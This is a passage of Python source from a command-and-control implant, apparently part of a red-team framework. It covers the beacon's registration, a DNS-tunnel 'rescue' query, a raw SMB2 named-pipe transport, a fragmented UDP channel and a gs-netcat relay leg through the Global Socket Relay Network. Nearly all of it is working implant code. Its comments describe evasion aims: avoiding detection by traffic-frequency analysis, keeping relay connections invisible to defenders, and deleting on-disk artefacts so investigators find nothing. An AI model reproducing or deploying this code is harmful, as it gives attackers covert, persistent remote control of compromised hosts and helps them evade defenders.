        """The upstream legs a registration can be attempted over now.

        Walked in `_RESCUE_UPSTREAM`'s order, which is the chain's order
        with `dns` removed -- and removed for the reason that constant
        gives: DNS carries nothing *out*, so a registration sent over it
        could never be followed by a result. Taking the order from there
        rather than restating it is what keeps the two from drifting when
        a sixth leg arrives.

        The gsocket leg is a candidate only when its carrier is already
        up. That is not an optimisation: the latch is the operator's
        decision, and a registration that started `gs-netcat` would make
        every healthy implant hold a connection to the Global Socket
        Relay Network for the life of the process. `_gsocket_ready`
        starts nothing -- with no child it answers False at once -- so a
        gsocket-only implant finds nothing to register over at beacon
        start, the preamble skips, and the leg registers from inside the
        loop on the cycle after the latch brought the carrier up, through
        the `action=register` arm `_beacon_gsocket` already carries.
        """
        enabled = {
            "https": self.https_enabled,
            "smb": self.smb_enabled,
            "quic": self.quic_enabled,
            "gsocket": self.gsocket_enabled and self._gsocket_ready(),
        }
        # `.get` and not `[]`: this runs in the beacon's main loop, and a
        # sixth name in `_RESCUE_UPSTREAM` that nobody added here would
        # otherwise raise a KeyError on an implant rather than cost that
        # one leg a registration.
        return [leg for leg in _RESCUE_UPSTREAM if enabled.get(leg)]

    def _register_upstream(self) -> bool:
        """Register over the first enabled upstream leg that answers.

        The preamble was gated on `https_enabled`, which was true enough
        while HTTPS was the only leg carrying an `action=register` of its
        own. The configuration this exists for is the one where it is
        off: an implant whose four original legs are all blocked reaches
        the team server over gsocket alone, and gated on HTTPS it would
        never register, never appear in the fleet, and look healthy from
        every other angle.

        Nothing is dropped by trying a check-in method here. Each of the
        other three sends `action=register` while `_registered` is False,
        which it is at both call sites -- the preamble has never
        registered, and the re-registration arm clears it first -- and
        the reply to a registration is an identity and never tasking.

        The four names below are the only ones `_registration_legs` can
        return, which is why the last arm is an `else`: a name it did not
        recognise would otherwise leave `delivered` unbound and raise in
        the beacon's main loop.
        """
        for leg in self._registration_legs():
            if leg == "https":
                # The one leg with a registration call of its own: its
                # check-in does not carry the register action itself.
                delivered = self._register_https()
            elif leg == "smb":
                delivered = self._adopt_registration(self._beacon_smb())
            elif leg == "quic":
                delivered = self._adopt_registration(self._beacon_quic())
            else:
                delivered = self._adopt_registration(self._beacon_gsocket())
            if delivered:
                return True
        return False

    def _start_cycle(self):
        """Clear what the last cycle learned.

        A failure from three cycles ago riding along in a rescue would make
        an operator read a stale reason as a current one, which is worse
        than no reason at all.
        """
        self._leg_status = {}
        self._rescue_flags = 0

    def _record_leg(self, transport: str, klass: int, code: int = 0):
        """Keep why one leg produced nothing. Never raises.

        Called from the four transport methods beside the debug log they
        already write. It clamps rather than validates: this sits on the
        failure path of every check-in, and a beacon that crashed while
        recording why it could not reach anywhere would be the worst
        possible trade.
        """
        try:
            self._leg_status[transport] = (int(klass), max(0, min(int(code),
                                                                  0xFFFF)))
        except Exception:
            pass

    # ── The rescue ──
    #
    # One query per exhaustion, and only when the resolver has shown it
    # answers. The detectable property of a DNS tunnel is rate and volume,
    # so the trigger is a latch and not an interval: one exhaustion, one
    # query, and nothing for a frequency analysis to find.

    _RESCUE_MAX_NAME = 253

    def _leg_recovered(self):
        """A leg delivered something: arm the latch for the next failure.

        And close the stuck window with it, which is the same event seen
        from the decider's side: the window closes when any upstream leg
        delivers, so the counter that says how long this outage has lasted
        and the budget it has spent both go back to where a fresh beacon
        starts. All four together and in one place, because a window that
        reopened already spent would be an implant that had quietly
        stopped deciding -- and the one caller of this is the one arm of
        `_beacon_loop` where an upstream leg delivered.

        **The radio rung's source binding is not among them**, and that is
        a correction rather than an omission. A leg delivering while the
        bind holds is the moment that rung is *working*: the traffic left
        by the leased address and took table 100. Dropping it here put the
        next cycle back out of the dead tapped port with `_stuck_cycles`
        reset to zero -- so the implant had to climb five hours again to
        re-run the rung, for ever, one delivering cycle per climb. A bind
        that has gone wrong is still re-decided: the implant goes dark,
        climbs to rung 3 again, and `_egress_radio` either re-associates
        or rolls back, and the rollback is where the unbind belongs.
        """
        self._rescue_sent = False
        self._rescue_answered = False
        self._stuck_cycles = 0
        self._egress_spent = 0
        # The one file this project puts on the disk goes with them: the
        # window is over, so the artefact that described it is removed
        # rather than left for the next reader -- or the next investigator
        # -- to find. Raises nothing.
        self._way_out_clear_state()

    def _rescue_name(self) -> Optional[str]:
        """The query name, or None when it will not fit.

        Not truncated when it is too long. A truncated record decrypts to
        nothing, and at the server that is indistinguishable from an
        attacker's noise -- so a zone with no room is a configuration fact
        to report, not a payload to mangle.
        """
        agent = self._agent_id or self._implant_id
        raw = _rescue_pack(self._leg_status, self._rescue_flags,
                           _rescue_fingerprint(agent))
        wrapped = self._encrypt(
            {_RESCUE_WRAPPER_KEY: base64.b64encode(raw).decode()})
        try:
            one, two = _rescue_to_labels(wrapped)
        except ValueError as exc:
            logger.debug("rescue: %s", exc)
            return None
        encoded_id = base64.b32encode(
            agent.encode()).decode().rstrip("=").lower()
        name = "%s.%s.%s.%s.%s" % (one, two, encoded_id, _RESCUE_MARKER,
                                   self.dns_domain)
        if len(name) > self._RESCUE_MAX_NAME:
            logger.debug(
                "rescue: the name would be %d characters, over the %d DNS "
                "allows; the zone leaves no room and nothing was sent",
                len(name), self._RESCUE_MAX_NAME)
            return None
        return name

    def _maybe_rescue(self) -> Optional[dict]:
        """Say why we are stuck, once, if anything can carry it.

        Returns whatever tasking came back, so the rescue reports and
        collects the next instruction in one exchange rather than two.
        """
        if not self.dns_enabled or self._rescue_sent:
            return None
        # The resolver must have shown that it answers. Without that the
        # query is noise with no recipient -- and that case is exactly the
        # one a model on the drop-box would be for.
        if not self._rescue_flags & _RESCUE_FLAG_DNS_ANSWERED:
            return None
        name = self._rescue_name()
        if name is None:
            return None
        self._rescue_sent = True
        try:
            results = _dns_query(name, "TXT", self.dns_resolver, timeout=10,
                                 source=self._way_out_source)
        except Exception as e:
            logger.debug("rescue: query failed: %s", e)
            return None
        for txt in results or ():
            try:
                return self._decrypt(txt)
            except Exception:
                # Same rule as _beacon_dns: a record that does not decrypt
                # is not tasking, whoever answered the query.
                continue
        return None

    def _beacon_https(self) -> Optional[dict]:
        info = self._system_info()
        info["action"] = "beacon"
        return self._https_post("beacon", info)

    def _send_result_https(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._https_post("result", result)

    # ── DNS transport ──

    def _beacon_dns(self) -> Optional[dict]:
        try:
            agent = self._agent_id or self._implant_id
            encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
            query = f"{encoded_id}.b.{self.dns_domain}"

            status = {}
            results = _dns_query(query, "TXT", self.dns_resolver, timeout=10,
                                 source=self._way_out_source,
                                 status=status)
            rcode = status.get("rcode", 0)
            if rcode:
                # SERVFAIL and NXDOMAIN are not answers. Recording them as
                # one would send a rescue into a resolver that will never
                # carry it -- noise with no recipient, which is the one
                # thing the trigger is meant to prevent.
                self._record_leg("dns", _RESCUE_CLASSES["resolve_failed"],
                                 rcode)
            else:
                # The resolver answered. Whether it carried tasking is a
                # separate question, and conflating the two is what makes a
                # DNS-only beacon unexplainable: `None` from here would
                # otherwise mean both "no route out" and "nothing queued".
                self._rescue_flags |= _RESCUE_FLAG_DNS_ANSWERED
                self._record_leg("dns", _RESCUE_CLASSES["answered"])
            for txt in results:
                try:
                    return self._decrypt(txt)
                except Exception:
                    # This used to fall back to json.loads(b64decode(txt)),
                    # so anyone able to answer the TXT query could task the
                    # implant without the key. A record that does not decrypt
                    # is not tasking; try the next one.
                    continue
        except Exception as e:
            logger.debug("DNS beacon failed: %s", e)
            self._record_leg("dns", _RESCUE_CLASSES["resolve_failed"])
        return None

    # ── SMB named-pipe transport ──

    def _smb_connect(self) -> Optional[socket.socket]:
        """Connect to SMB server and open a named pipe for C2 comms."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            host = self.smb_server
            port = 445
            if ":" in host:
                host, port = host.rsplit(":", 1)
                port = int(port)
            sock.connect((host, port))

            # SMB2 Negotiate
            neg = self._smb2_negotiate_request()
            sock.sendall(self._smb_netbios_wrap(neg))
            resp = self._smb_recv(sock)
            if not resp or resp[12:14] != b"\x00\x00":
                sock.close()
                return None

            # SMB2 Session Setup (anonymous/null)
            sess = self._smb2_session_setup()
            sock.sendall(self._smb_netbios_wrap(sess))
            resp = self._smb_recv(sock)
            if not resp:
                sock.close()
                return None
            self._smb_session_id = resp[44:52]

            # SMB2 Tree Connect to IPC$
            tree = self._smb2_tree_connect_request(host)
            sock.sendall(self._smb_netbios_wrap(tree))
            resp = self._smb_recv(sock)
            if not resp:
                sock.close()
                return None
            self._smb_tree_id = resp[40:44]

            # SMB2 Create (open named pipe)
            create = self._smb2_create_pipe(self.smb_pipe_name)
            sock.sendall(self._smb_netbios_wrap(create))
            resp = self._smb_recv(sock)
            if not resp or len(resp) < 84:
                sock.close()
                return None
            self._smb_file_id = resp[132:148]

            return sock
        except Exception as e:
            logger.debug("SMB connect failed: %s", e)
            return None

    def _smb_netbios_wrap(self, data: bytes) -> bytes:
        return b"\x00" + struct.pack(">I", len(data))[1:] + data

    def _smb_recv(self, sock: socket.socket) -> Optional[bytes]:
        try:
            hdr = b""
            while len(hdr) < 4:
                chunk = sock.recv(4 - len(hdr))
                if not chunk:
                    return None
                hdr += chunk
            length = struct.unpack(">I", b"\x00" + hdr[1:4])[0]
            data = b""
            while len(data) < length:
                chunk = sock.recv(min(length - len(data), 65536))
                if not chunk:
                    return None
                data += chunk
            return data
        except Exception:
            return None

    def _smb2_negotiate_request(self) -> bytes:
        # The `_request` suffix is not decoration. This method and
        # `_smb2_tree_connect_request` below used to be called
        # `_smb2_negotiate` and `_smb2_tree_connect`, which are also the
        # names of the smbloot helpers further down this class -- and those
        # come later, so they won. `_smb_connect` called them with the
        # wrong arguments, raised TypeError on its first real statement,
        # caught it, logged at debug level and returned None: the SMB C2
        # transport could never connect, and said nothing about it. A test
        # now walks the project for any name bound twice in one scope.
        hdr = b"\xfeSMB"
        hdr += struct.pack("<H", 64)         # StructureSize
        hdr += struct.pack("<H", 0)          # CreditCharge
        hdr += struct.pack("<I", 0)          # Status
        hdr += struct.pack("<H", 0)          # Command: NEGOTIATE
        hdr += struct.pack("<H", 1)          # CreditRequest
        hdr += struct.pack("<I", 0)          # Flags
        hdr += struct.pack("<I", 0)          # NextCommand
        hdr += struct.pack("<Q", 1)          # MessageId
        hdr += struct.pack("<I", 0)          # Reserved
        hdr += struct.pack("<I", 0)          # TreeId
        hdr += struct.pack("<Q", 0)          # SessionId
        hdr += b"\x00" * 16                  # Signature
        # Negotiate body
        body = struct.pack("<H", 36)         # StructureSize
        body += struct.pack("<H", 2)         # DialectCount
        body += struct.pack("<H", 1)         # SecurityMode
        body += struct.pack("<H", 0)         # Reserved
        body += struct.pack("<I", 0)         # Capabilities
        body += b"\x00" * 16                 # ClientGuid
        body += struct.pack("<I", 0)         # NegotiateContextOffset
        body += struct.pack("<H", 0)         # NegotiateContextCount
        body += struct.pack("<H", 0)         # Reserved2
        body += struct.pack("<H", 0x0202)    # Dialect SMB 2.0.2
        body += struct.pack("<H", 0x0210)    # Dialect SMB 2.1
        return hdr + body

    def _smb2_session_setup(self) -> bytes:
        hdr = self._smb2_header(1, 0)       # Command: SESSION_SETUP
        # NTLMSSP Negotiate (Type 1) — anonymous
        ntlm = b"NTLMSSP\x00"
        ntlm += struct.pack("<I", 1)        # Type 1
        ntlm += struct.pack("<I", 0xe2088297)  # Flags
        ntlm += b"\x00" * 16                # DomainNameFields + WorkstationFields
        body = struct.pack("<H", 25)         # StructureSize
        body += struct.pack("<B", 0)         # Flags
        body += struct.pack("<B", 1)         # SecurityMode
        body += struct.pack("<I", 0)         # Capabilities
        body += struct.pack("<I", 0)         # Channel
        body += struct.pack("<H", 88)        # SecurityBufferOffset
        body += struct.pack("<H", len(ntlm)) # SecurityBufferLength
        body += struct.pack("<Q", 0)         # PreviousSessionId
        body += ntlm
        return hdr + body

    def _smb2_tree_connect_request(self, host: str) -> bytes:
        hdr = self._smb2_header(3, 0)       # Command: TREE_CONNECT
        path = f"\\\\{host}\\IPC$".encode("utf-16-le")
        body = struct.pack("<H", 9)          # StructureSize
        body += struct.pack("<H", 0)         # Reserved
        body += struct.pack("<H", 72)        # PathOffset (from start of header)
        body += struct.pack("<H", len(path)) # PathLength
        body += path
        return hdr + body

    def _smb2_create_pipe(self, pipe_name: str) -> bytes:
        hdr = self._smb2_header(5, 0)       # Command: CREATE
        name = pipe_name.encode("utf-16-le")
        body = struct.pack("<H", 57)         # StructureSize
        body += struct.pack("<B", 0)         # SecurityFlags
        body += struct.pack("<B", 2)         # RequestedOplockLevel
        body += struct.pack("<I", 0)         # ImpersonationLevel
        body += struct.pack("<Q", 0)         # SmbCreateFlags
        body += struct.pack("<Q", 0)         # Reserved
        body += struct.pack("<I", 0x001f01ff)  # DesiredAccess: GENERIC_ALL
        body += struct.pack("<I", 7)         # FileAttributes
        body += struct.pack("<I", 7)         # ShareAccess: READ|WRITE|DELETE
        body += struct.pack("<I", 1)         # CreateDisposition: FILE_OPEN
        body += struct.pack("<I", 0)         # CreateOptions
        body += struct.pack("<H", 120)       # NameOffset
        body += struct.pack("<H", len(name)) # NameLength
        body += struct.pack("<I", 0)         # CreateContextsOffset
        body += struct.pack("<I", 0)         # CreateContextsLength
        body += name
        return hdr + body

    def _smb2_header(self, command: int, tree_id_val: int) -> bytes:
        hdr = b"\xfeSMB"
        hdr += struct.pack("<H", 64)
        hdr += struct.pack("<H", 0)          # CreditCharge
        hdr += struct.pack("<I", 0)          # Status
        hdr += struct.pack("<H", command)
        hdr += struct.pack("<H", 1)          # CreditRequest
        hdr += struct.pack("<I", 0)          # Flags
        hdr += struct.pack("<I", 0)          # NextCommand
        hdr += struct.pack("<Q", 2)          # MessageId
        hdr += struct.pack("<I", 0)          # Reserved
        hdr += getattr(self, "_smb_tree_id", struct.pack("<I", tree_id_val))
        hdr += getattr(self, "_smb_session_id", struct.pack("<Q", 0))
        hdr += b"\x00" * 16                  # Signature
        return hdr

    def _smb_write_pipe(self, sock: socket.socket, data: bytes) -> bool:
        try:
            hdr = self._smb2_header(9, 0)    # Command: WRITE
            body = struct.pack("<H", 49)     # StructureSize
            body += struct.pack("<H", 70)    # DataOffset
            body += struct.pack("<I", len(data))  # Length
            body += struct.pack("<Q", 0)     # Offset
            body += self._smb_file_id        # FileId (16 bytes)
            body += struct.pack("<I", 0)     # Channel
            body += struct.pack("<I", 0)     # RemainingBytes
            body += struct.pack("<H", 0)     # WriteChannelInfoOffset
            body += struct.pack("<H", 0)     # WriteChannelInfoLength
            body += struct.pack("<I", 0)     # Flags
            body += data
            sock.sendall(self._smb_netbios_wrap(hdr + body))
            resp = self._smb_recv(sock)
            return resp is not None
        except Exception:
            return False

    def _smb_read_pipe(self, sock: socket.socket) -> Optional[bytes]:
        try:
            hdr = self._smb2_header(8, 0)    # Command: READ
            body = struct.pack("<H", 49)     # StructureSize
            body += struct.pack("<B", 0)     # Padding
            body += struct.pack("<B", 0)     # Flags
            body += struct.pack("<I", 65536) # Length
            body += struct.pack("<Q", 0)     # Offset
            body += self._smb_file_id        # FileId (16 bytes)
            body += struct.pack("<I", 1)     # MinimumCount
            body += struct.pack("<I", 0)     # Channel
            body += struct.pack("<I", 0)     # RemainingBytes
            body += struct.pack("<H", 0)     # ReadChannelInfoOffset
            body += struct.pack("<H", 0)     # ReadChannelInfoLength
            body += b"\x00"                  # Buffer
            sock.sendall(self._smb_netbios_wrap(hdr + body))
            resp = self._smb_recv(sock)
            if not resp or len(resp) < 84:
                return None
            data_offset = struct.unpack_from("<H", resp, 66)[0] - 64
            data_length = struct.unpack_from("<I", resp, 68)[0]
            return resp[64 + data_offset:64 + data_offset + data_length]
        except Exception:
            return None

    def _beacon_smb(self) -> Optional[dict]:
        """Exchange C2 data over SMB named pipe."""
        sock = self._smb_connect()
        if not sock:
            self._record_leg("smb", _RESCUE_CLASSES["unreachable"])
            return None
        try:
            # No decoy envelope here. _wrap_payload exists to make an HTTP
            # request body look like ordinary API traffic; a named pipe
            # write carries raw bytes with no JSON body for an inspector to
            # read, so the envelope would add length and buy nothing -- and
            # the listener would have to unwrap it again.
            #
            # _system_info() carries both "id" (the implant id, always set)
            # and "agent_id" (None until the server assigns one), so it is
            # the only thing that needs to go in. There used to be an
            # explicit "agent_id": self._agent_id or self._implant_id above
            # the spread, which the spread then overwrote on every call --
            # dead, and misleading about what identifies a beacon on first
            # contact. _beacon_https builds its payload the same way.
            payload = self._encrypt(dict(self._system_info(),
                                         action="beacon" if self._registered
                                         else "register"))
            if not self._smb_write_pipe(sock, payload.encode()):
                self._record_leg("smb", _RESCUE_CLASSES["bad_payload"])
                return None
            resp_data = self._smb_read_pipe(sock)
            if not resp_data:
                # Same hole QUIC had: the pipe was written and answered
                # nothing, which raises no exception, so this leg used to
                # record nothing and packed as `not_attempted`.
                self._record_leg("smb", _RESCUE_CLASSES["timed_out"])
                return None
            try:
                return self._decrypt(resp_data.decode() if isinstance(resp_data, bytes) else resp_data)
            except Exception:
                # This used to fall back to json.loads(resp_data), accepting
                # unencrypted tasking from anything on the pipe. A response
                # that does not decrypt is a failed exchange.
                self._record_leg("smb", _RESCUE_CLASSES["bad_payload"])
                return None
        except Exception as e:
            logger.debug("SMB beacon failed: %s", e)
            # HTTPS and QUIC both recorded from their except branch; SMB
            # recorded only its connect failure, so everything that went
            # wrong after a successful connect was invisible.
            self._record_leg("smb", _rescue_class_of(e))
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _send_result_smb(self, task_id: str, status: str, output: str,
                         data: Optional[dict] = None):
        sock = self._smb_connect()
        if not sock:
            return
        try:
            result = {
                "action": "result",
                "agent_id": self._agent_id or self._implant_id,
                "task_id": task_id,
                "status": status,
                "output": output,
            }
            if data:
                result["data"] = data
            # Same reasoning as the check-in above: no envelope on a pipe.
            payload = self._encrypt(result)
            self._smb_write_pipe(sock, payload.encode())
            self._smb_read_pipe(sock)
        except Exception as e:
            logger.debug("SMB result send failed: %s", e)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    # ── QUIC (UDP) transport ──

    def _quic_send(self, data: dict) -> Optional[dict]:
        """Lightweight QUIC-like C2 channel over UDP with TLS-style framing."""
        try:
            host = self.quic_server
            port = 4433
            if ":" in host:
                host, port = host.rsplit(":", 1)
                port = int(port)

            # No envelope on a datagram either: there is no HTTP body to
            # disguise, and the frame header below already describes the
            # length the receiver needs.
            payload = self._encrypt(data).encode()

            # Frame: [4-byte length][payload]
            frame = struct.pack(">I", len(payload)) + payload

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)

            # Fragment into 1200-byte QUIC-style datagrams
            frag_size = 1200
            total_frags = (len(frame) + frag_size - 1) // frag_size
            stream_id = struct.unpack(">I", os.urandom(4))[0]

            for i in range(total_frags):
                chunk = frame[i * frag_size:(i + 1) * frag_size]
                # Header: [stream_id(4)][frag_index(2)][total_frags(2)][chunk]
                dgram = struct.pack(">IHH", stream_id, i, total_frags) + chunk
                sock.sendto(dgram, (host, port))

            # Receive reassembled response
            fragments: dict = {}
            expected = None
            while True:
                try:
                    resp_data, _ = sock.recvfrom(1500)
                    if len(resp_data) < 8:
                        continue
                    r_stream, r_idx, r_total = struct.unpack(">IHH", resp_data[:8])
                    expected = r_total
                    fragments[r_idx] = resp_data[8:]
                    if len(fragments) == expected:
                        break
                except socket.timeout:
                    break

            sock.close()

            if not fragments or (expected and len(fragments) < expected):
                # Nothing usable came back, and no exception was raised to
                # say so: an unconnected UDP socket does not get the ICMP
                # port-unreachable delivered on Linux, so a dead endpoint
                # is a plain timeout. Found in the VM -- this leg used to
                # record only from the except branch below, so the quiet
                # path left the record empty and it packed as
                # `not_attempted`. The operator was told "QUIC: not tried"
                # about a leg that was tried and timed out.
                self._record_leg("quic", _RESCUE_CLASSES["timed_out"])
                return None

            reassembled = b""
            for i in sorted(fragments.keys()):
                reassembled += fragments[i]

            resp_len = struct.unpack(">I", reassembled[:4])[0]
            resp_payload = reassembled[4:4 + resp_len]

            try:
                return self._decrypt(resp_payload.decode())
            except Exception:
                # This used to fall back to json.loads(resp_payload),
                # accepting unencrypted tasking from any UDP sender that
                # answered. A response that does not decrypt is a failed
                # exchange -- and one worth telling the operator about,
                # because something on that port answered.
                self._record_leg("quic", _RESCUE_CLASSES["bad_payload"])
                return None
        except Exception as e:
            logger.debug("QUIC beacon failed: %s", e)
            self._record_leg("quic", _rescue_class_of(e))
            return None

    def _beacon_quic(self) -> Optional[dict]:
        # Same shape as _beacon_smb and _beacon_https: _system_info()
        # already carries "id" and "agent_id", and an explicit agent_id
        # above the spread was dead code.
        return self._quic_send(dict(self._system_info(),
                                    action="beacon" if self._registered
                                    else "register"))

    def _send_result_quic(self, task_id: str, status: str, output: str,
                          data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._quic_send(result)

    # ── gsocket (a gs-netcat forward) transport ──
    #
    # The fifth leg, and the only one whose precondition is not "the team
    # server is reachable at an address this implant can name". A
    # `gs-netcat` child dials *out* to the Global Socket Relay Network,
    # the team server's carrier does the same, and the two are paired by a
    # shared secret. So the leg survives the case the other four share:
    # the HTTPS URL, the DNS zone, the SMB host and the QUIC host all
    # blocked or burned at once.
    #
    # Four properties are deliberate, and three of them are copies.
    #
    # **The secret never reaches a command line.** `gs-netcat` accepts
    # `-s <secret>` and its own documentation warns against it, because
    # `ps` is world-readable -- and on an implant it is readable by
    # whoever found the device. `-k <path>` only, here and nowhere else.
    #
    # **The leg is lazy with a warm latch.** The carrier does not run at
    # beacon start: a healthy implant holds no GSRN connection at all,
    # because a connection to a third-party relay network is a thing a
    # defender can see and nothing an implant should be holding while
    # HTTPS works. It starts the first time a cycle ends with no upstream
    # leg having delivered -- the same condition the rescue latch uses --
    # and then stays up for the life of the process, so the second outage
    # costs no readiness wait.
    #
    # **The binary is verified before it is exec'd**, by a copy of
    # `gsocket/carrier.binary_problem`. The copy is forced: this file is
    # served to a target as source text and may import nothing from this
    # repository. `test_gsocket_leg` compares the two word for word, as
    # `test_dns_rescue` compares the rescue format's copy, because two
    # checks that disagree about wording are two checks that will
    # disagree about behaviour next.
    #
    # **The HTTP path is the one the HTTPS leg uses**, aimed at the
    # forward instead of at the callback URL. There is no second client:
    # the far end of the forward is the same beacon socket, so the
    # malleable C2 profile applies inside the pipe unchanged, and a
    # failure inside the pipe is recorded against `gsocket` because
    # `_https_post` is told which leg to blame.
    #
    # Which address the child's own `-p` forward *binds* is not known;
    # the question, the one-line check that would settle it and what
    # depends on the answer are recorded above `GsocketCarrier.argv` in
    # `software/c2/gsocket/carrier.py`. Nothing here depends on it: this
    # leg only ever **connects** to `127.0.0.1`.

    def _gsocket_settings(self, block: dict) -> str:
        """Read the leg's settings; return why one is unusable, or "".

        A reason and not an exception, because `Beacon.__init__` is on the
        path of every implant that has a config file at all: a bad
        `local_port` in one leg must cost that leg and not the beacon.

        The minimums are the ones `gsocket/config.validate_leg` uses, for
        the reasons it gives -- a `restart_delay_seconds` of zero restarts
        `gs-netcat` as fast as it can fail, which is a busy loop and a
        flood of joins on the relay network, both loud in exactly the
        place an implant has to be quiet; a `ready_timeout_seconds` of
        zero declares every carrier not-ready the instant it started, so
        the leg would never be used and nothing would say why. This is not
        a second validator: it reads five values for use and refuses one
        it cannot use. Strict validation stays on the team server's
        startup path, which already has it.
        """
        if not self.gsocket_secret_file.strip():
            return ("c2.fallback.gsocket.secret_file is empty, and the "
                    "secret is this leg's whole address on the relay "
                    "network -- `gs-netcat -k <path>` has nothing to read. "
                    "Nothing in this repository writes that file: create it "
                    "by hand on this host, mode 0600, holding the secret "
                    "and nothing else. The GSRN section of "
                    "docs/LISTENERS.md gives the command")

        scheme = block.get("scheme", _GSOCKET_DEFAULTS["scheme"])
        # Normalised rather than compared as written: a URL scheme is
        # case-insensitive, and what it becomes is a URL, which wants one
        # spelling.
        normalised = scheme.strip().lower() if isinstance(scheme, str) else None
        if normalised not in ("http", "https"):
            return ("c2.fallback.gsocket.scheme is %r; it must be http or "
                    "https" % (scheme,))
        self.gsocket_scheme = normalised

        port = block.get("local_port", _GSOCKET_DEFAULTS["local_port"])
        # bool is an int in Python, and `local_port: true` is a plausible
        # YAML typo that would otherwise pass as port 1.
        if isinstance(port, bool) or not isinstance(port, int) \
                or not 1 <= port <= 65535:
            return ("c2.fallback.gsocket.local_port is %r; it must be an "
                    "integer between 1 and 65535, because it is the port "
                    "the forward comes out at and the port this leg then "
                    "addresses on 127.0.0.1" % (port,))
        self.gsocket_local_port = port

        for key, minimum, attribute in (
                ("restart_delay_seconds", 1, "gsocket_restart_delay_seconds"),
                ("max_restarts", 0, "gsocket_max_restarts"),
                ("ready_timeout_seconds", 1, "gsocket_ready_timeout_seconds")):
            value = block.get(key, _GSOCKET_DEFAULTS[key])
            if isinstance(value, bool) or not isinstance(value, int) \
                    or value < minimum:
                return ("c2.fallback.gsocket.%s is %r; it must be an integer "
                        "of at least %d" % (key, value, minimum))
            setattr(self, attribute, value)
        return ""

    def _gsocket_base(self) -> str:
        """Where this leg posts: the near end of its own forward.

        `127.0.0.1` because that is the address this process *connects*
        to, which is settled whatever the child turns out to bind.
        """
        return "%s://127.0.0.1:%d/api/v1" % (self.gsocket_scheme,
                                             self.gsocket_local_port)

    def _gsocket_argv(self) -> List[str]:
        """`gs-netcat -k <secret_file> -w -p <local_port>`.

        A copy of `gsocket/carrier.implant_argv`, which exists in that
        file next to the server's shape so that a reviewer has something
        to compare this against; `test_gsocket_leg` compares them.

        `-w` makes this end a client that **waits** for its peer rather
        than one that fails when the peer is not there yet, and the normal
        case is exactly that: an implant powers up in a cupboard long
        before anybody starts the team server.
        """
        return [os.fspath(self.gsocket_binary_path),
                "-k", os.fspath(self.gsocket_secret_file),
                "-w",
                "-p", str(self.gsocket_local_port)]

    def _gsocket_environment(self) -> Dict[str, str]:
        """This process's environment, less anything of ours.

        A copy of `gsocket/carrier._child_environment`, and a deny rule
        rather than an allow list for the reason given there: `gs-netcat`
        reads `HOME`, the proxy variables and the relay overrides, and a
        variable withheld from it produces a carrier that joins the relay
        network and never finds its peer -- the one failure here that
        looks identical to a hostile network, a wrong secret and a peer
        that is simply off.

        What is dropped is every `RACCOON_*` variable, which is where this
        project keeps its own secrets, and `GSOCKET_ARGS`, which gsocket's
        tools append to the argv built above.
        """
        return {
            name: value
            for name, value in os.environ.items()
            if not name.startswith(_GSOCKET_ENVIRONMENT_PREFIX_DENIED)
            and name not in _GSOCKET_ENVIRONMENT_DENIED
        }

    def _gsocket_binary_problem(self) -> Optional[str]:
        """Why this leg's `gs-netcat` cannot be exec'd, or `None`.

        A deliberate copy of `gsocket/carrier.binary_problem`, reason
        strings included, because this file may import nothing from this
        repository. Existence, the executable bit and the SHA-256, in that
        order, each returning a reason rather than raising -- the caller
        decides whether a reason is fatal, and here it is: a leg with no
        binary is a leg that is off, recorded as `binary_missing`.

        One clause of the digest-mismatch reason reads oddly from an
        implant's side: it speaks of "the secret that fronts the beacon
        socket", which is the team server's framing. It is copied
        unchanged on purpose. The wording is a known, parked review
        finding, and a divergence improvised here would break the test
        that compares the two checks and hide the parked item with it.

        `sha256` empty skips the digest check, exactly as
        `c2.sliver.sha256` does: a deployment that never measured its
        binary still has to be able to run one.
        """
        path = os.fspath(self.gsocket_binary_path)
        if not path.strip():
            # An empty `binary_path`, which is what a configuration
            # written before anybody installed gs-netcat holds. Said
            # plainly, because `os.stat("")` would otherwise produce a
            # reason whose subject is an empty string -- a sentence
            # beginning ": no such file", which reads as a bug in this
            # check rather than as a missing setting.
            return ("no gs-netcat binary is configured: binary_path is empty, "
                    "so there is nothing for the carrier to exec")
        try:
            status = os.stat(path)
        except FileNotFoundError:
            return ("%s: no such file, so there is no gs-netcat to exec. "
                    "Install the binary at that path, or correct the "
                    "configured binary_path" % path)
        except OSError as exc:
            return ("%s: cannot be examined: %s. Until that is answered the "
                    "carrier cannot know what it would be exec'ing"
                    % (path, exc))

        if not stat.S_ISREG(status.st_mode):
            # A directory carries the executable bit, so an exec-bit check
            # on its own passes one and the failure arrives from the spawn
            # as a bare permission error against a path that looks right.
            return ("%s: not a regular file, so it is not a binary this "
                    "carrier can exec" % path)

        if not os.access(path, os.X_OK):
            return ("%s: mode is 0o%03o, and the user running this process "
                    "may not execute it. The carrier execs gs-netcat "
                    "directly, so either chmod +x that file or point "
                    "binary_path at a copy this user may run"
                    % (path, stat.S_IMODE(status.st_mode)))

        expected = (self.gsocket_sha256 or "").strip().lower()
        if not expected:
            # Empty is "do not verify", the meaning c2.sliver.sha256 has.
            return None

        digest = hashlib.sha256()
        try:
            with open(path, "rb") as handle:
                while True:
                    chunk = handle.read(_GSOCKET_HASH_CHUNK)
                    if not chunk:
                        break
                    digest.update(chunk)
        except OSError as exc:
            return ("%s: cannot be read to check its sha256: %s. An "
                    "unverifiable binary is treated as a failed check and "
                    "not as a passed one" % (path, exc))

        actual = digest.hexdigest()
        if actual != expected:
            return ("%s: its sha256 is %s, but the configuration expects %s. "
                    "Either the digest in the configuration is stale, or "
                    "this is not the binary that was measured -- and the "
                    "second one is a gs-netcat somebody else put there, "
                    "which would be handed the secret that fronts the beacon "
                    "socket" % (path, actual, expected))
        return None

    def _gsocket_start(self) -> bool:
        """Bring the carrier up if it is not, and say whether it is now.

        **The one place that spawns the child, reached from two callers.**
        `_beacon_loop` calls it where it concludes that no upstream leg
        delivered: that is the latch, from either of the two positions the
